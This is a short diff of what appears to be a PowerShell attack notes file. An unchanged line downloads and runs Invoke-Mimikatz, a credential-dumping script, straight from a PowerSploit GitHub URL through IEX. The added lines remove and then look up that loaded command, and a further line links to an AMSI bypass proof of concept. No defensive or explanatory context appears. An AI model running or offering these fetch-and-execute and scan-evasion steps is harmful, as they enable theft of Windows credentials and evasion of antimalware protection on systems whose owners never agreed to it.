@@ -1,4 +1,12 @@
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1')
+
+Remove-Variable -Name "Invoke-Mimikatz" -ErrorAction SilentlyContinue
+
+
+Get-Command "Invoke-Mimikatz"
+
+
+
 https://github.com/V-i-x-x/AMSI-BYPASS/blob/main/POC.ps1
 
 
